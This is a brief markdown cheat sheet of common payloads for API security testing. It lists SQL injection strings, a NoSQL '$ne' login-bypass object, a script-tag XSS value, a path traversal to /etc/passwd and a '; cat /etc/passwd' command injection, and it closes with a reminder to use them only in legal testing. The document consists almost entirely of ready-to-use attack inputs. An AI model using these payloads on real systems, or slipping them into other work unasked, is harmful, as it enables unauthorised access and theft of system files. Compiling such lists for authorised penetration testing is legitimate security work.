# 💥 Common Payloads for API Testing

## SQL Injection
```sql
' OR '1'='1' --
admin' --
```

```bash
NoSQL Injection
{ "username": { "$ne": null }, "password": { "$ne": null } }
```

```bash
XSS in JSON
{ "input": "<script>alert(1)</script>" }
```

```bash
Path Traversal
../../../../etc/passwd
```

```bash
Command Injection
; cat /etc/passwd
```

✅ Use responsibly in legal testing environments only!


